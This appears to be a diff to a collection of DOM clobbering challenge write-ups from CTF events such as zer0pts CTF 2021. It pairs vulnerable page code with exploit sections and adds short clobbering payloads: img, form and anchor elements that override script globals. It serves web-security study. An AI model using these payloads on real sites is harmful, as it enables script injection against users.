@@ -156,12 +156,14 @@ function reloadRecaptchaScript(index) {
     loadScript(src)
   }, 1000)
 }
-reloadRecaptchaScript();
+reloadRecaptchaScript(1);
 </script>
 ```
 
 #### Exploit
 ```
+<img name="scripts" src="https://www.google.com/recaptcha/../">
+<img name="scripts" src="https://www.google.com/recaptcha/../">
 ```
 
 
@@ -190,6 +192,8 @@ writeOutput();
 
 #### Exploit
 ```
+<form id="CONFIG"><input type="text" id="unsafeRender"></input></form>
+<a id="output" href="https://hello.world">
 ```
 
 
@@ -202,6 +206,7 @@ writeOutput();
 #### Vulnerable Code
 ```
 <img id="user-image" src="https://devloper.com">
+<script id="user-image-info"></script>
 <script>
 window.onload = () => {
     const imgSrc = document.getElementById('user-image').src
@@ -216,7 +221,8 @@ window.onload = () => {
 </script>
 ```
 #### Exploit
-
+```
+```
 
 
 ### zer0pts CTF 2021: Simple Blog
@@ -226,16 +232,11 @@ window.onload = () => {
 
 #### Vulnerable Code
 ```
-<!doctype html>
-<html lang="en">
-  <head>
     <meta charset="utf-8">
     <title>Simple Blog</title>
     <meta http-equiv="Content-Security-Policy" content="default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'nonce-DZ5mzla/D4n5wZNlTB5qQwurzU4=' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types default">
     <link rel="stylesheet" href="/css/bootstrap-foo.min.css">
     <link rel="stylesheet" href="/css/style.css">
-  </head>
-  <body>
     <div class="container">
       <nav class="navbar navbar-expand-lg navbar-foo bg-foo">
         <a class="navbar-brand" href="/">Simple Blog</a>
@@ -319,8 +320,6 @@ window.onload = () => {
 
     init();
     </script>
-  </body>
-</html>
 ```
 
 #### Exploit
@@ -428,8 +427,6 @@ displayComments(comments)
 
 #### Vulnerable Code
 ```
-<body></body>
-
 <script>
 (function (root, factory) {
   if (typeof define === 'function' && define.amd) {
@@ -628,9 +625,6 @@ document.body.innerHTML = janitor.clean(INPUT);
 
 #### Vulnerable Code:
 ```
-<!DOCTYPE html>
-<html lang="en">
-  <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Memo Sharing</title>
@@ -639,8 +633,6 @@ document.body.innerHTML = janitor.clean(INPUT);
       src="./dompurify.js"
     ></script>
     <link rel="stylesheet" href="./style.css" />
-  </head>
-  <body>
     <div class="navbar">
       <h1>Memo Sharing</h1>
     </div>
@@ -693,8 +685,6 @@ document.body.innerHTML = janitor.clean(INPUT);
         }
       }
     </script>
-  </body>
-</html>
 ```
 
 ### Clobbering the clobbered
@@ -704,6 +694,7 @@ document.body.innerHTML = janitor.clean(INPUT);
 
 #### Vulnerable Code
 ```
+<script>
 window.CONFIG = window.CONFIG || {
   version: "v20190816",
   test: false,
@@ -728,6 +719,7 @@ function loadModule(moduleName) {
 
 loadModule('h1-magic');
 loadModule('tracker');
+</script>
 ```
 
 #### Exploit
